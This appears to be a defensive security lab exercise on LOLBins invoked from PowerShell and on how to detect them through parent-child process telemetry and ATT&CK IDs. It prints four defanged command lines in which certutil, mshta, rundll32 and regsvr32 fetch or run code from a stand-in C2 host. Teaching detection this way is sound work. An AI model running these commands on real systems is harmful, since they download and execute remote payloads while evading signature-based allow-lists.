## BRIEF
LOLBins (Living-off-the-Land Binaries) are **signed, trusted Windows tools** abused to do attacker work — download or proxied code execution — so the attacker ships no additional binary of their own. That's exactly what makes them evade allow-lists built on file identity: the binary really is signed by Microsoft.
Invoked *from PowerShell*, the tell isn't the LOLBin's signature — it's the **parent→child process chain**: `powershell.exe` spawning one of these tools is the pattern that matters.
Record a LOLBin, the parent→child detection tell, and the ATT&CK ID in `finding.txt`.

## GUIDED STEPS

1. **Read four LOLBin abuse patterns** (static reference, defanged, fictional):
   ```text
   # READ ONLY — static, defanged, fictional:
   certutil.exe -urlcache -split -f hxxps://fake-c2[.]test/p.bin p.bin   # download via a cert tool (T1105/T1140)
   mshta.exe hxxps://fake-c2[.]test/a.hta                                # execute remote HTA (T1218.005)
   rundll32.exe shell32.dll,Control_RunDLL hxxps://fake-c2[.]test/x      # proxy execution (T1218.011)
   regsvr32.exe /s /u /i:hxxps://fake-c2[.]test/s.sct scrobj.dll         # "Squiblydoo" scriptlet (T1218.010)
   ```
   Each one is a **signed, trusted** binary doing attacker work (download or proxied execution) — no attacker-authored binary ever touches disk.

2. **Read the detection tell** (static reference):
   ```text
   naive control: allow-list by file identity/signature -> every one of these passes, they're all genuinely signed
   real tell:     process-creation telemetry showing powershell.exe AS THE PARENT of certutil/mshta/rundll32/regsvr32
                  (Sysmon Event ID 1, or Windows Security Event ID 4688)
   ```
   The LOLBin's own signature tells a defender nothing; the **parent→child relationship** is the signal. ATT&CK classifies this as **T1218.\*** (System Binary Proxy Execution) plus **T1105** (Ingress Tool Transfer) for the download step.

3. **Record your finding**:
   Create `finding.txt`:
   ```text
   LOLBins abused from PowerShell: certutil (download), mshta (remote HTA execution), rundll32 (proxy execution), regsvr32 (scriptlet execution).
   They're all signed, trusted Windows binaries -- allow-listing by file identity misses the abuse entirely.
   The real detection tell is the parent-child process chain: powershell.exe spawning one of these tools (Sysmon Event ID 1 / Windows Event ID 4688).
   ATT&CK: T1218 (System Binary Proxy Execution), T1105 (Ingress Tool Transfer).
   ```

4. **Check your work**:
   ```bash
   lab check ps L4.6
   ```
